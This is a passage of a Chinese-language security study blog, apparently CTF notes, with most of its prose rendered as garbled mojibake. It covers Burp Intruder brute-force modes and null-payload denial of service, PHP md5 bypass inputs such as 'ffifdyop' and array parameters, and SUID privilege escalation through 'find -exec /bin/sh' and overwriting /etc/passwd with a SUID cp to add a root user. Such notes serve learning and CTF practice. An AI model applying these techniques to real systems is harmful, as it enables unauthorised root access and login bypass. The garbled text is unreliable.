<h4 id="4-Runtime-file"><a href="#4-Runtime-file" class="headerlink" title="4.Runtime file"></a>4.Runtime file</h4><p>é€‰æ‹©è‡ªå·±çš„å­—å…¸æ–‡ä»¶</p>
<h4 id="5-Custom-iterator"><a href="#5-Custom-iterator" class="headerlink" title="5.Custom iterator"></a>5.Custom iterator</h4><p>ï¼ˆå¯ä»¥è‡ªå®šä¹‰æ‹¼æ¥å­—æ®µï¼Œæ¯”å¦‚username:passwordï¼Œè¿™æ ·çˆ†ç ´çš„ä¸¤åˆ—æ•°æ®è¢«:éš”å¼€è¿›è¡Œçˆ†ç ´ï¼‰</p>
<p>è‡ªå®šä¹‰è¿­ä»£å™¨ã€‚è¿™ç§è´Ÿè½½ç±»å‹ï¼Œå¯ä»¥é…ç½®é¡¹ç›®çš„å¤šä¸ªåˆ—è¡¨ï¼Œå¹¶ä½¿ç”¨ç”Ÿæˆçš„åˆ—è¡¨ä¸­é¡¹çš„æ‰€æœ‰æ’åˆ—æœ‰æ•ˆè½½è·ã€‚å®ƒæä¾›äº†ä¸€ä¸ªå¼ºæœ‰åŠ›çš„æ–¹æ³•æ ¹æ®ç»™å®šçš„æ¨¡æ¿ï¼Œä»¥äº§ç”Ÿå­—ç¬¦æˆ–å…¶ä»–é¡¹ç›®çš„å®šåˆ¶æ’åˆ—ã€‚</p>
<h4 id="6-Character-substitution"><a href="#6-Character-substitution" class="headerlink" title="6.Character substitution"></a>6.Character substitution</h4><p>å­—ç¬¦æ›¿æ¢ã€‚æ­¤è´Ÿè½½ç±»å‹å…è®¸æ‚¨é…ç½®ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¹¶åº”ç”¨å„ç§å­—ç¬¦æ›¿æ¢åˆ°æ¯ä¸ªé¡¹ç›®ã€‚è¿™å¯èƒ½æ˜¯åœ¨å¯†ç çŒœæµ‹æ”»å‡»éå¸¸æœ‰ç”¨ï¼Œç”¨æ¥äº§ç”Ÿåœ¨å­—å…¸ä¸­çš„å•è¯å¸¸è§çš„å˜åŒ–ã€‚</p>
<h4 id="7-Case-modification"><a href="#7-Case-modification" class="headerlink" title="7.Case modification"></a>7.Case modification</h4><p>æ­¤è´Ÿè½½ç±»å‹å…è®¸é…ç½®ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¹¶åº”ç”¨å„ç§æƒ…å†µä¸‹ä¿®æ”¹æ¯ä¸ªé¡¹ç›®ã€‚è¿™å¯èƒ½å¯¹å¯†ç çŒœæµ‹æ”»å‡»éå¸¸æœ‰ç”¨ï¼Œç”¨æ¥äº§ç”Ÿåœ¨å­—å…¸ä¸­çš„å•è¯çš„æƒ…å†µä¸‹çš„å˜åŒ–ã€‚</p>
<h4 id="8-Recursivegrep"><a href="#8-Recursivegrep" class="headerlink" title="8.Recursivegrep"></a>8.Recursivegrep</h4><p>é€’å½’grepï¼Œè¦ç”¨è¿™ä¸ªå¿…é¡»åœ¨Intruder&gt;options&gt;Grep-extractä¸‹æ·»åŠ ä¸€ä¸ªå“åº”åŒ¹é…ï¼Œæ¯”å¦‚è¯´æˆ‘ä¸€ä¸ªè¯·æ±‚é¡µéœ€è¦å‰ä¸€ä¸ªå“åº”é¡µä¸­çš„å†…å®¹ï¼Œè¿™é‡Œå°±å¯ä»¥è¿™æ ·ä½¿ç”¨äº†ã€‚</p>
<h4 id="9-Dates"><a href="#9-Dates" class="headerlink" title="9.Dates"></a>9.Dates</h4><p>æ—¶é—´ã€æ—¥æœŸ</p>
<h4 id="10-Null-payloads"><a href="#10-Null-payloads" class="headerlink" title="10.Null payloads"></a>10.Null payloads</h4><p>è¿™ç§æ”»å‡»è½½è·äº§ç”Ÿæœ‰æ•ˆè½½è·ï¼Œå…¶å€¼æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚å½“æŸç§æ”»å‡»è¯·æ±‚éœ€è¦åå¤å‘é€åŒæ ·çš„è¯·æ±‚ï¼Œä½†è¿™ç§è¯·æ±‚ç›¸å¯¹äºåŸºæœ¬è¯·æ±‚æ˜¯æ²¡æœ‰ä»»ä½•ä¿®æ”¹ï¼Œè¿™ç§æ”»å‡»è½½è·äº§ç”Ÿæœ‰æ•ˆè½½è·ï¼Œè¿™å¯ç”¨äºå„ç§æ”»å‡»ï¼Œä¾‹å¦‚é‡‡é›† cookiesæ¥è¿›è¡Œæµ‹åºåˆ†æï¼›åº”ç”¨å±‚çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œè¿™äº›è¯·æ±‚è¢«é‡å¤å‘é€ï¼Œå¯¼è‡´æœåŠ¡å™¨ä¸Šäº§ç”Ÿé«˜å·¥ä½œè´Ÿè·çš„ä»»åŠ¡ï¼Œæˆ–ä¿æ´»ä¼šè¯ä»¤ç‰Œï¼Œä»¥ä¾¿è¿™äº›ä»¤ç‰Œåœ¨å…¶å®ƒçš„é—´æ­‡è¯•éªŒä¸­ä½¿ç”¨ã€‚ä½¿ç”¨æ­¤è½½è·ç±»å‹ï¼Œå®ƒç”šè‡³æ²¡æœ‰å¿…è¦åœ¨è¯·æ±‚æ¨¡æ¿ä¸­æ ‡å¿—æœ‰æ•ˆè½½è·ä½ç½®ã€‚æ‚¨å¯ä»¥é…ç½®Burpäº§ç”Ÿä¸€å®šç‰¹å®šæ•°ç›®çš„ç©ºæœ‰æ•ˆè½½è·ï¼Œæˆ–æ— é™æœŸåœ°æŒç»­ä¸‹å»ã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨æ•°å­—ã€æ—¥æœŸç­‰å…¶ä»–æ–¹å¼äº§ç”Ÿå¤§é‡çš„è¿æ¥ï¼Œå¯¼è‡´æœåŠ¡å™¨çš„è´Ÿè½½è¿‡é«˜ã€‚</p>
<h3 id="Attack-typeï¼ˆçˆ†ç ´æ–¹å¼ï¼‰"><a href="#Attack-typeï¼ˆçˆ†ç ´æ–¹å¼ï¼‰" class="headerlink" title="Attack typeï¼ˆçˆ†ç ´æ–¹å¼ï¼‰"></a>Attack typeï¼ˆçˆ†ç ´æ–¹å¼ï¼‰</h3><p><img src="/2022/05/31/daily/image-20220710224734912.png" alt="image-20220710224734912"></p>
<h4 id="1-Sniper"><a href="#1-Sniper" class="headerlink" title="1.Sniper"></a>1.Sniper</h4><p> è¿™ä¸ªæ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨çš„ï¼ŒSniperæ˜¯ç‹™å‡»æ‰‹çš„æ„æ€ã€‚è¿™ä¸ªæ¨¡å¼ä¼šä½¿ç”¨å•ä¸€çš„payloadã€å°±æ˜¯å¯¼å…¥å­—å…¸çš„payloadã€‘ç»„ã€‚å®ƒä¼šé’ˆå¯¹æ¯ä¸ªpositionä¸­$$ä½ç½®è®¾ç½®payloadã€‚è¿™ç§æ”»å‡»ç±»å‹é€‚åˆå¯¹å¸¸è§æ¼æ´ä¸­çš„è¯·æ±‚å‚æ•°å•ç‹¬åœ°è¿›è¡Œæµ‹è¯•ã€‚æ”»å‡»ä¸­çš„è¯·æ±‚æ€»æ•°åº”è¯¥æ˜¯positionæ•°é‡å’Œpayloadæ•°é‡çš„ä¹˜ç§¯ã€‚</p>
<h4 id="2-Battering-ram"><a href="#2-Battering-ram" class="headerlink" title="2.Battering ram"></a>2.Battering ram</h4><p> è¿™ä¸€æ¨¡å¼æ˜¯ä½¿ç”¨å•ä¸€çš„payloadç»„ã€‚å®ƒä¼šé‡å¤payloadå¹¶ä¸”ä¸€æ¬¡æŠŠæ‰€æœ‰ç›¸åŒçš„payloadæ”¾å…¥æŒ‡å®šçš„ä½ç½®ä¸­ã€‚è¿™ç§æ”»å‡»é€‚åˆé‚£ç§éœ€è¦åœ¨è¯·æ±‚ä¸­æŠŠç›¸åŒçš„è¾“å…¥æ”¾åˆ°å¤šä¸ªä½ç½®çš„æƒ…å†µã€‚è¯·æ±‚çš„æ€»æ•°æ˜¯payloadç»„ä¸­payloadçš„æ€»æ•°ã€‚ç®€å•è¯´å°±æ˜¯ä¸€ä¸ªplayloadå­—å…¸åŒæ—¶åº”ç”¨åˆ°å¤šä¸ªpositionä¸­ã€‚</p>
<h4 id="3-Pitchfork"><a href="#3-Pitchfork" class="headerlink" title="3.Pitchfork"></a>3.Pitchfork</h4><p>è¿™ä¸€æ¨¡å¼æ˜¯ä½¿ç”¨å¤šä¸ªpayloadç»„ã€‚å¯¹äºå®šä¹‰çš„ä½ç½®å¯ä»¥ä½¿ç”¨ä¸åŒçš„payloadç»„ã€‚æ”»å‡»ä¼šåŒæ­¥è¿­ä»£æ‰€æœ‰çš„payloadç»„ï¼ŒæŠŠpayloadæ”¾å…¥æ¯ä¸ªå®šä¹‰çš„ä½ç½®ä¸­ã€‚æ¯”å¦‚ï¼špositionä¸­Aå¤„æœ‰aå­—å…¸ï¼ŒBå¤„æœ‰bå­—å…¸ï¼Œåˆ™aã€1ã€‘å°†ä¼šå¯¹åº”bã€1ã€‘è¿›è¡Œattackå¤„ç†ï¼Œè¿™ç§æ”»å‡»ç±»å‹éå¸¸é€‚åˆé‚£ç§ä¸åŒä½ç½®ä¸­éœ€è¦æ’å…¥ä¸åŒä½†ç›¸å…³çš„è¾“å…¥çš„æƒ…å†µã€‚è¯·æ±‚çš„æ•°é‡åº”è¯¥æ˜¯æœ€å°çš„payloadç»„ä¸­çš„payloadæ•°é‡ã€‚</p>
<h4 id="4-Cluster-bomb"><a href="#4-Cluster-bomb" class="headerlink" title="4.Cluster bomb"></a>4.Cluster bomb</h4><p>è¿™ç§æ¨¡å¼ä¼šä½¿ç”¨å¤šä¸ªpayloadç»„ã€‚æ¯ä¸ªå®šä¹‰çš„ä½ç½®ä¸­æœ‰ä¸åŒçš„payloadç»„ã€‚æ”»å‡»ä¼šè¿­ä»£æ¯ä¸ªpayloadç»„ï¼Œæ¯ç§payloadç»„åˆéƒ½ä¼šè¢«æµ‹è¯•ä¸€éã€‚æ¯”å¦‚ï¼špositionä¸­Aå¤„æœ‰aå­—å…¸ï¼ŒBå¤„æœ‰bå­—å…¸ï¼Œåˆ™ä¸¤ä¸ªå­—å…¸å°†ä¼šå¾ªç¯æ­é…ç»„åˆè¿›è¡Œattackå¤„ç†è¿™ç§æ”»å‡»é€‚ç”¨äºé‚£ç§ä½ç½®ä¸­éœ€è¦ä¸åŒä¸”ä¸ç›¸å…³æˆ–è€…æœªçŸ¥çš„è¾“å…¥çš„æ”»å‡»ã€‚æ”»å‡»è¯·æ±‚çš„æ€»æ•°æ˜¯å„payloadç»„ä¸­payloadæ•°é‡çš„ä¹˜ç§¯ã€‚ï¼ˆå³å¯ä»¥åœ¨ç”¨æˆ·åå’Œå¯†ç ä¸¤å¤„ç”¨ä¸¤ä¸ªå­—å…¸çˆ†ç ´ï¼‰</p>
<h2 id="3-gitå‘½ä»¤"><a href="#3-gitå‘½ä»¤" class="headerlink" title="3.gitå‘½ä»¤"></a>3.gitå‘½ä»¤</h2><p>ä½¿ç”¨githackï¼Œè®°å½•ä¸€äº›å‘½ä»¤</p>
<p><img src="/2022/05/31/daily/image-20220729114811362.png" alt="image-20220729114811362"></p>
<h2 id="4-å‡½æ•°è®°å½•"><a href="#4-å‡½æ•°è®°å½•" class="headerlink" title="4.å‡½æ•°è®°å½•"></a>4.å‡½æ•°è®°å½•</h2><h3 id="1-phpå‡½æ•°md5"><a href="#1-phpå‡½æ•°md5" class="headerlink" title="1)phpå‡½æ•°md5"></a>1)phpå‡½æ•°md5</h3><p>åšé¢˜æ—¶ï¼Œäº†è§£åˆ°äº†ä¸€ä¸ªæ–°çš„å‡½æ•°<code>md5</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">php md5å‡½æ•°ä»‹ç»ä¸ºï¼š</span><br><span class="line"></span><br><span class="line">md5( string , raw )</span><br><span class="line"></span><br><span class="line">string : è§„å®šéœ€è¦è®¡ç®—çš„å­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line">raw : è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ã€‚</span><br><span class="line"></span><br><span class="line">        <span class="literal">true</span>ï¼š<span class="number">16</span>å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼</span><br><span class="line"></span><br><span class="line">        <span class="literal">false</span>(é»˜è®¤): <span class="number">32</span>å­—ç¬¦åå…­è¿›åˆ¶æ•°</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>æ¯”è¾ƒå¸¸ç”¨çš„</p>
<p>æ•°å­—å‹ï¼š<code>129581926211651571912466741651878684928</code></p>
<p><img src="/2022/05/31/daily/image-20220811135742130.png" alt="image-20220811135742130"></p>
<p>å­—ç¬¦å‹ï¼š<code>ffifdyop</code></p>
<p><img src="/2022/05/31/daily/image-20220811135813137.png" alt="image-20220811135813137"></p>
<p>å‘ç°éƒ½æœ‰â€™orâ€™çš„å½¢å¼ï¼Œå¯ä»¥æ„é€ å¿…çœŸçš„ç»“æœ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">MD5å‡½æ•°æœ‰ä¸€ä¸ªæ¼æ´ï¼Œå½“è¾“å…¥çš„ä¸ºæ•°ç»„æ—¶ï¼Œä¼šè¿”å›ä¸ºNULL</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥å½“é‡åˆ°md5(p1)===md5(p2)ï¼ŒæŠŠp1å’Œp2è¿›è¡Œå¼ºæ¯”è¾ƒæ—¶ï¼Œåˆè¦æ±‚p1å’Œp2ä¸ç›¸ç­‰</span><br><span class="line"></span><br><span class="line">ç”±äºä¸¤ä¸ªä¸åŒçš„å­—ç¬¦MD5å€¼å¾ˆéš¾ä¸€è‡´ï¼Œäºæ˜¯è¾“å…¥p1[]å’Œp2[]ä¸¤ä¸ªåå­—ä¸€è‡´çš„å­—ç¬¦ï¼Œéšä¾¿èµ‹å€¼ï¼Œ</span><br><span class="line">p1[]=1&amp;p2[]=2</span><br><span class="line">è¿”å›ä¸ºç©ºï¼Œä½¿å¾—å¼ºæ¯”è¾ƒæˆç«‹</span><br><span class="line"></span><br><span class="line">**</span><br><span class="line">ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢</span><br><span class="line">æˆ‘æƒ³èµ·ä¹‹å‰çš„é‡åˆ°ä¸€ä¸ªé¢˜ï¼Œä¹Ÿæœ‰æ•°ç»„ï¼Œé—®äº†ä¸€ä¸‹å¤§ä½¬</span><br><span class="line"></span><br><span class="line">å¤§ä½¬è¯´ï¼Œå› ä¸ºæ²¡æœ‰å¯¹æ•°ç»„ä¸­çš„å…ƒç´ æ•°é‡å£°æ˜ï¼Œå‡½æ•°ä¸çŸ¥é“æ•°ç»„å…ƒç´ ç¬¬å‡ ä¸ªçš„å€¼æ˜¯1ï¼ˆæˆ–2ï¼‰</span><br><span class="line">å¯¼è‡´å‡½æ•°åˆ°å¤„æ‰«ï¼Œæœ€åè¿”å›NULLã€å› ä¸ºè¿™ä¸ªå…ƒç´ ä½ç½®æˆ‘ä»¬æ ¹æœ¬å°±æ²¡å®šã€‘</span><br><span class="line"></span><br><span class="line">ä¸‹é¢ä¸¾å‡ ä¸ªä¾‹å­ï¼Œä»¥æˆ‘ä¸ªäººç†è§£</span><br><span class="line">å¦‚æœæ˜¯</span><br><span class="line">p1[0]=1&amp;p2[0]=2</span><br><span class="line">æ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºåªå®šä¹‰äº†0å·ä½çš„æ•°æ®ï¼Œè€Œä¸”ä¸ç›¸ç­‰ï¼Œå…¶ä»–ä½ç½®æ•°æ®æ²¡å®šä¹‰ï¼Œæ‰€ä»¥æ¯”è¾ƒä¹Ÿä¸å¯èƒ½å‡ºç°ç›¸ç­‰</span><br><span class="line"></span><br><span class="line">p1[0]=1&amp;p2[1]=1</span><br><span class="line">æ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºè¿™é‡Œp1[]å®šä¹‰äº†0å·ä½ä¸º1ï¼Œè€Œp2å®šä¹‰çš„æ˜¯1å·ä½ä¸º1ï¼Œæ¯”è¾ƒæ˜¯æŒ‰é¡ºåºæ¯”è¾ƒçš„ï¼Œä¸¤ä¸ªæ•°å€¼è™½ç„¶ä¸€æ ·ï¼Œä½†æ˜¯ä½ç½®ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æ¯”è¾ƒè¿˜æ˜¯ä¸ç›¸ç­‰</span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯<span class="number">0</span>eå¼€å¤´çš„ï¼š</span><br><span class="line"></span><br><span class="line"> QNKCDZO</span><br><span class="line"> <span class="number">240610708</span></span><br><span class="line"> s878926199a</span><br><span class="line"> s155964671a</span><br><span class="line"> s214587387a</span><br><span class="line"> s214587387a</span><br></pre></td></tr></table></figure></div>

<h2 id="5-ç‰¹æ®Šæƒé™ä½"><a href="#5-ç‰¹æ®Šæƒé™ä½" class="headerlink" title="5.ç‰¹æ®Šæƒé™ä½"></a>5.ç‰¹æ®Šæƒé™ä½</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjcxMjkyOA==&mid=2247484922&idx=1&sn=ba666d73dc1ed57385eda7210afca433&chksm=9baceb75acdb62634d94269e2052f2856bcebac7e1b0962f30132cbda7494813ae6ad2c0f88c&mpshare=1&scene=23&srcid=0830y3hzCRRlcsleoKEyGZr8&sharer_sharetime=1661831991788&sharer_shareid=30776e1834041fdca5e0b68533a2427e#rd">å‚è€ƒæ–‡ç« </a></p>
<h3 id="1ï¼‰åˆ©ç”¨SUIDææƒ"><a href="#1ï¼‰åˆ©ç”¨SUIDææƒ" class="headerlink" title="1ï¼‰åˆ©ç”¨SUIDææƒ"></a>1ï¼‰åˆ©ç”¨SUIDææƒ</h3><h4 id="ä»€ä¹ˆæ˜¯suidï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯suidï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯suidï¼Ÿ"></a>ä»€ä¹ˆæ˜¯suidï¼Ÿ</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">Set <span class="keyword">User</span>   <span class="title">ID</span>çš„ä¸€ç§æƒé™ç±»å‹ï¼Œå…è®¸ç”¨æˆ·ä½¿ç”¨æŒ‡å®šçš„ç”¨æˆ·æƒé™æ‰§è¡Œæ–‡ä»¶ã€‚é‚£äº›å…·ç”¨suidæƒé™çš„æ–‡ä»¶ä»¥æœ€é«˜çš„æƒé™è¿è¡Œã€‚å‡è®¾æˆ‘ä»¬ä»¥érootç”¨æˆ·èº«ä»½è®¿é—®ç›®æ ‡ç³»ç»Ÿï¼Œå¹¶ä¸”æˆ‘ä»¬å‘ç°äºŒè¿›åˆ¶æ–‡ä»¶å¯ç”¨äº†suidä½ï¼Œé‚£ä¹ˆ</span><br><span class="line">è¿™äº›æ–‡ä»¶/ç¨‹åº/å‘½ä»¤å¯ä»¥ä»¥rootæƒé™è¿è¡Œ</span><br><span class="line"></span><br><span class="line">SUIDçš„ç›®çš„å°±æ˜¯ï¼šè®©æœ¬æ¥æ²¡æœ‰ç›¸åº”æƒé™çš„ç”¨æˆ·è¿è¡Œè¿™ä¸ªç¨‹åºæ—¶ï¼Œå¯ä»¥è®¿é—®ä»–æ²¡æœ‰æƒé™çš„èµ„æº</span><br></pre></td></tr></table></figure></div>

<h4 id="ä»€ä¹ˆæ˜¯SGID"><a href="#ä»€ä¹ˆæ˜¯SGID" class="headerlink" title="ä»€ä¹ˆæ˜¯SGID"></a>ä»€ä¹ˆæ˜¯SGID</h4><p>Gçš„æ„æ€å°±æ˜¯groupï¼ŒåŠŸèƒ½å’ŒsuidåŸºæœ¬ä¸ç›¸åŒï¼Œå”¯ä¸€åŒºåˆ«å°±æ˜¯suidè·å¾—å‘½ä»¤æ‰€å±ç”¨æˆ·çš„èº«ä»½å’Œæƒé™ï¼Œè€Œsgidæ˜¯è·å–æ‰€å±ç”¨æˆ·ç»„çš„èº«ä»½å’Œæƒé™</p>
<h4 id="SUIDæƒé™"><a href="#SUIDæƒé™" class="headerlink" title="SUIDæƒé™"></a>SUIDæƒé™</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XQUERY"><figure class="iseeu highlight /xquery"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>ï¼ŒSUIDæƒé™åªèƒ½è®¾ç½®äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>ï¼Œå‘½ä»¤æ‰§è¡Œè€…è¦æœ‰äºŒè¿›åˆ¶æ–‡ä»¶çš„æ‰§è¡Œæƒã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ï¼Œå‘½ä»¤æ‰§è¡Œè€…æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ä¼šè·å¾—è¯¥ç¨‹åºçš„å±ä¸»èº«ä»½ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>ï¼ŒSUIDæƒé™åªåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å³å¦‚<span class="built_in">æœroot</span>ç»™ä¸€ä¸ªç¨‹åºèµ‹äºˆäº†SUIDæƒé™ï¼Œåˆ™æ™®é€šç”¨æˆ·åœ¨æ‰§è¡Œè¯¥ç¨‹åºè¿‡ç¨‹ä¸­ï¼Œ<span class="built_in">æ˜¯root</span>æƒé™ã€‚</span><br></pre></td></tr></table></figure></div>



<hr>
<h4 id="å…³é”®"><a href="#å…³é”®" class="headerlink" title="*å…³é”®"></a>*å…³é”®</h4><p>1.æŸ¥çœ‹å…·æœ‰rootç”¨æˆ·æƒé™çš„SUIDäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">å‘½ä»¤æ¥æŸ¥æ‰¾æ‹¥æœ‰SUIDæƒé™çš„ç¨‹åºã€‚</span><br><span class="line"></span><br><span class="line">permæŒ‡å®šæƒé™ï¼Œ<span class="attribute">-u</span>=sä»£è¡¨SUIDæƒé™ï¼ŒtypeæŒ‡å®šæ–‡ä»¶ç±»å‹ï¼Œfè¡¨ç¤ºå¸¸è§„æ–‡ä»¶</span><br></pre></td></tr></table></figure></div>

<p>2.å·²çŸ¥çš„å¯ç”¨æ¥ææƒçš„linuxå¯æ‰§è¡Œçš„æ–‡ä»¶åˆ—è¡¨å¦‚ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOS"><figure class="iseeu highlight /dos"><table><tr><td class="code"><pre><span class="line">Nmapã€Vimã€<span class="built_in">find</span>ã€Bashã€<span class="built_in">More</span>ã€Lessã€Nanoã€cp</span><br></pre></td></tr></table></figure></div>

<hr>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><h5 id="ï¼ˆ1ï¼‰åˆ©ç”¨findè·å–rootæƒé™shell"><a href="#ï¼ˆ1ï¼‰åˆ©ç”¨findè·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ1ï¼‰åˆ©ç”¨findè·å–rootæƒé™shell"></a>ï¼ˆ1ï¼‰åˆ©ç”¨findè·å–rootæƒé™shell</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">find</span> <span class="regexp">/ -name cron.php -exec â€œ/</span>bin/shâ€ \;</span><br><span class="line"></span><br><span class="line">è¿™ä¸ªæ–‡ä»¶åï¼Œåªè¦å­˜åœ¨å°±è¡Œï¼Œç›®çš„æ˜¯è®©<span class="keyword">find</span>å‘½ä»¤å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œåé¢çš„-execå°±æ˜¯åŠ ä¸Šå‘½ä»¤</span><br><span class="line"></span><br><span class="line">è¿™é‡Œ<span class="keyword">find</span>æœ‰suidæƒé™ï¼Œæ™®é€šç”¨æˆ·æ‰§è¡Œæ—¶ï¼Œä¼šå˜æˆrootç”¨æˆ·ï¼Œæ‰§è¡Œ<span class="regexp">/bin/</span>shå‘½ä»¤æ—¶ï¼Œä¼šè¿›å…¥rootç”¨æˆ·ï¼Œä»è€Œå®ç°ææƒ</span><br><span class="line"></span><br><span class="line">å¦‚æœ<span class="keyword">find</span>æ²¡æœ‰suidæƒé™ï¼Œæ‰§è¡Œ<span class="regexp">/bin/</span>shå‘½ä»¤åï¼Œä»ç„¶æ˜¯æ™®é€šç”¨æˆ·</span><br><span class="line"></span><br><span class="line">Â·/ä¸ºæ ¹ç›®å½•</span><br><span class="line">Â·-name æŒ‰æ–‡ä»¶åæŸ¥æ‰¾</span><br><span class="line">Â·-exec å¯¹åŒ¹é…å¯¹è±¡æ‰§è¡Œçš„å‘½ä»¤ï¼Œä»¥;ç»“æŸ</span><br><span class="line">ä½†æ˜¯ï¼ˆ;ï¼‰æ˜¯ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦ç”¨ï¼ˆ\ï¼‰è½¬ä¹‰</span><br></pre></td></tr></table></figure></div>

<h5 id="ï¼ˆ2ï¼‰åˆ©ç”¨cpè·å–rootæƒé™shell"><a href="#ï¼ˆ2ï¼‰åˆ©ç”¨cpè·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ2ï¼‰åˆ©ç”¨cpè·å–rootæƒé™shell"></a>ï¼ˆ2ï¼‰åˆ©ç”¨cpè·å–rootæƒé™shell</h5><p>ä»¥cpä¸ºä¾‹ï¼Œè¿™é‡Œç»™cpæ·»åŠ SUIDæƒé™åšæµ‹è¯•ï¼Œæ‹¥æœ‰SUIDæƒé™çš„ç¨‹åºä¼šæœ‰rwxå˜æˆrwsã€‚</p>
<p><img src="/2022/05/31/daily/image-20220830133409844.png" alt="image-20220830133409844"></p>
<p>å¯ä»¥é€šè¿‡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure></div>

<p>å‘½ä»¤æ¥æŸ¥æ‰¾æ‹¥æœ‰SUIDæƒé™çš„ç¨‹åºã€‚</p>
<p><img src="/2022/05/31/daily/image-20220830133446426.png" alt="image-20220830133446426"></p>
<p>å½“æ™®é€šç”¨æˆ·è¿è¡Œcpå‘½ä»¤æ—¶ï¼Œæ­¤æ—¶çš„cpæƒé™å°±ä¸ºrootï¼Œåˆ©ç”¨æ—¶ï¼Œå¯ä»¥cpæŠŠ/etc/passwdå¤åˆ¶åˆ°æ¡Œé¢ï¼Œç„¶åè¿›è¡Œä¿®æ”¹ã€‚</p>
<p>é¦–å…ˆç”¨opensslç”Ÿæˆä¸€ä¸ªå¯†ç ã€‚passwdå‚æ•°ä»£è¡¨ç”Ÿæˆä¸€ä¸ªå¯†ç ï¼Œ-1ä¸ºmd5ï¼Œ-saltæŒ‡å®šç›ï¼ˆéšæ„æŒ‡å®šï¼‰ï¼Œæœ€åè·Ÿè¦åŠ å¯†çš„å€¼ï¼Œä¹Ÿå°±æ˜¯å¯†ç abcdã€‚</p>
<p><img src="/2022/05/31/daily/image-20220830133504874.png" alt="image-20220830133504874"></p>
<p>ç„¶åæŒ‰ç…§etc/passwdçš„æ ¼å¼æ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œæƒé™æŒ‰rootçš„å†™å³å¯ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220830133645874.png" alt="image-20220830133645874"></p>
<p>æ·»åŠ åæˆ‘ä»¬ç”¨cpå†æŠŠæ–‡ä»¶å¤åˆ¶å›å»è¿›è¡Œæ›¿æ¢ï¼Œæ­¤æ—¶å°±æ·»åŠ äº†ä¸€ä¸ªabcdç”¨æˆ·ï¼Œæƒé™ä¸ºrootã€‚</p>
<p><img src="/2022/05/31/daily/image-20220830133656254.png" alt="image-20220830133656254"></p>
